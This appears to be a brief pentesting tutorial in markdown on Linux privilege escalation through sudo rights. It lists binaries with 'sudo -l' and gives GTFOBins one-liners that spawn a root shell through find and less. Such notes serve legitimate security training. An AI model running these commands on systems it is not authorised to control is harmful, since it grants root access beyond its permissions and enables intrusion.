# Privilege Escalation: Sudo

In this privilege escalation technique, we search for command can use sude without password and find exploit code from GTFObins that can be used to get root privilege.

---
* **using command " sudo -l " : to know bins and found it.**

![img](screenshots/sudo/sudo-l.png)

* **We find 3 bins :**
* **go to site : " https://gtfobins.linuxsec.org/ " and search exploit code to use it.**
* **search for " find " exploit code for this bin ,and we find " sudo find . -exec /bin/sh \\ ;  -quit "**

![img](screenshots/sudo/get_root_by_sudo-l.png)


* **search for " less " exploit code for this bin ,and we find " sudo less /etc/hosts "**

![img](screenshots/sudo/sudo_less.png)

* **Inside this page write " !/bin/bash "**

![img](screenshots/sudo/inside_less.png)

* **Then click enter ,now uou have root privilege**

![img](screenshots/sudo/get_root_by__less.png)



